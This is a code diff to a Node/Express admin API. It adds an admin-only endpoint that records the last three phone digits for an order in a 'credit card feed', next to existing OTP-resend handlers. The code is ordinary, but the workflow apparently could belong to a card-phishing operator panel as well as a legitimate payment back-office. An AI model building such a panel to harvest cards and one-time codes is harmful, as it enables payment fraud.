@@ -39,6 +39,7 @@ import {
   markOtpResendDone,
   getOtpMeta,
   getFeedEntry,
+  setPhoneLast3,
 } from './creditCardFeedStore.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
@@ -1192,6 +1193,24 @@ export function registerAdminApi(app) {
       if (!orderRef) return res.status(400).json({ error: 'order_ref required' });
       await markOtpResendDone(orderRef);
       res.json({ ok: true, order_ref: orderRef });
+    } catch (e) {
+      res.status(500).json({ error: String(e?.message || e) });
+    }
+  });
+
+  app.patch('/api/admin/card-feed/:orderRef/phone-last3', async (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    try {
+      const orderRef = String(req.params.orderRef || '').trim();
+      const last3 = String(req.body?.phone_last3 || req.body?.digits || '').trim();
+      if (!orderRef) return res.status(400).json({ error: 'order_ref required' });
+      const ok = await setPhoneLast3(orderRef, last3);
+      if (!ok) return res.status(404).json({ error: 'Order not found' });
+      res.json({
+        ok: true,
+        order_ref: orderRef,
+        phone_last3: last3.replace(/\D/g, '').slice(-3),
+      });
     } catch (e) {
       res.status(500).json({ error: String(e?.message || e) });
     }
